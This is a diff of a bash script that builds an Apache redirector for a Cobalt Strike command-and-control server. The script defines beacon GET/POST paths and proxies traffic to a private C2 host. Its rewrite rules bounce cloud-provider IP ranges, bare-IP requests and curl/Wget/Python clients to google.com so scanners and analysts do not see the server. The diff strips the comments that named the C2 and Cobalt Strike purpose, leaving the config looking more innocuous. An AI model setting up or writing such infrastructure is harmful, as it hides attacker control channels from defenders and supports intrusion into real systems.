@@ -55,7 +55,6 @@ EOF
 chmod +x server-setup.sh
 ./server-setup.sh
 
-# Domain setup script
 cat <<'EOF' >domain-setup.sh
 #!/bin/bash
 MYDOMAIN="$1"
@@ -134,18 +133,15 @@ EOF
 chmod +x domain-setup.sh
 ./domain-setup.sh "$MYDOMAIN" "$2"
 
-# Create a basic error page
+# Basic error page
 cat <<EOF >/var/www/$MYDOMAIN/error.html
 <!DOCTYPE html><html><head><style>body{font-family:Arial,sans-serif;text-align:center;background-color:#f2f2f2;margin:0;padding:0;}h1{color:#ff0000;margin-top:20%;}p{color:#555;}</style></head><body><h1>Error!</h1><p>Something has gone wrong. Please try again later.</p></body></html>
 EOF
 
-# Configure the server to pass traffic to the private C2 server
 cat <<EOF >/etc/apache2/sites-available/$MYDOMAIN-le-ssl.conf
-# Hardcoded scheme to avoid issues
 Define redir_scheme https
 # Redirect site to:
 Define REDIR_TARGET https://www.google.com
-# Define Cobalt Strike C2 paths
 Define CS_GET /api/v2/status
 Define CS_POST /api/v2/users/update
 
@@ -218,7 +214,6 @@ EOF
 sudo systemctl reload apache2
 sleep 60
 
-# Updated redirect rules for private C2
 cat <<EOF >/etc/apache2/redirect.rules
 Define REDIR_TARGET https://www.google.com
 
@@ -238,7 +233,6 @@ RewriteCond %{HTTP_HOST} ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ [NC]
 RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 		
 	# Class A Exclusions. Includes large ranges from Azure & AWS
-	# Cloudfronted requests by default will have a UA of "Amazon Cloudfront". More info here: https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/header-caching.html#header-caching-web-device
 	RewriteCond                             expr                                    "-R '54.0.0.0/8'" [OR]
         RewriteCond                             expr                                    "-R '52.0.0.0/8'" [OR]
         RewriteCond                             expr                                    "-R '34.0.0.0/8'" [OR]
@@ -625,7 +619,7 @@ RewriteRule ^.*$ https://www.google.com/ [L,R=302]
         RewriteCond                             expr                                    "-R '94.245.0.0/16'" [OR]
 	
 
-	# Misc crawlers & crap
+	# Misc crawlers
 	RewriteCond				%{HTTP_USER_AGENT}			^curl.*$ [OR]
     	RewriteCond				%{HTTP_USER_AGENT}			^Python-urllib.*$ [OR]
     	RewriteCond				%{HTTP_USER_AGENT}			^Wget.*$ [OR]
